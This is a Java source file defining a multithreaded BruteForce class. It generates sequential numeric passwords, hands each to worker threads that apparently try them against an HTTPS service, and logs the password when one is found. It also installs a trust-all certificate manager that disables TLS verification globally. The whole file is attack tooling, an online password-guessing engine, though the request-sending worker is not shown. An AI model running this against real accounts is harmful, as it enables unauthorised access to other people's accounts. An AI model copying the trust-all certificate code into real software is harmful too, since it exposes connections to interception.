package zipy.co.il;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.Queue;
import java.util.concurrent.*;

/**
 * Created by Zloy on 10.06.2017.
 */
public class BruteForce implements IBruteForce {

    private static Logger LOG = LoggerFactory.getLogger(BruteForce.class);

    private LinkedBlockingQueue<Runnable> queue = new LinkedBlockingQueue<>(900);

    private ThreadPoolExecutor poll = new ThreadPoolExecutor(30, 90, 30, TimeUnit.SECONDS, queue);

    private Queue<WorkerThread> outcastQueue = new ConcurrentLinkedQueue<>();

    private String password = "0";

    private String realPassword = "";

    //todo только 100 запросов, -1 для полного конца
    private long condition = 100;

    @Override
    public void stop() {
        poll.shutdownNow();
    }

    public String getRealPassword() {
        return realPassword;
    }

    @Override
    public void run() throws KeyManagementException, NoSuchAlgorithmException {


        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }

                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }
        };

        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

        long count = 0;

        WorkerThread thread = generateWorker();


        while(!poll.isShutdown()){
            try {
                if((condition == -1 || condition >= count)){
                    poll.execute(thread);
                    thread = null;
                    thread = generateWorker();
                    count++;
                } else poll.shutdown();

            }catch(RejectedExecutionException e){

            }
        }
        LOG.info("end run BruteForce!!!");
    }

    private WorkerThread generateWorker(){
        WorkerThread thread = outcastQueue.poll();
        return (thread != null) ? thread : new WorkerThread(this.password = generatePassword(this.password),this);
    }

    @Override
    public void sendOutcastWorker(WorkerThread worker) {
        outcastQueue.add(worker);
    }

    @Override
    public void sendPassword(String password) {
        poll.shutdownNow();
        this.realPassword = password;
        LOG.info( "!!!PASSWORD!!! = " + password);
    }

    private String generatePassword(String oldPassword){
        if (oldPassword == null) return null;

        StringBuilder newPasword = new StringBuilder();
        int step = 1;
        for(int k = oldPassword.length() - 1; k >= 0 ; k--){
            int val = Character.getNumericValue(oldPassword.charAt(k));
            val = val + step;
            if(val <= 9) {
                step = 0;
            } else {
                val = 0;
            }
            newPasword.insert(0, val);
        }

        if(step == 1) newPasword.insert(0, 0);

        return newPasword.toString();
    }
}
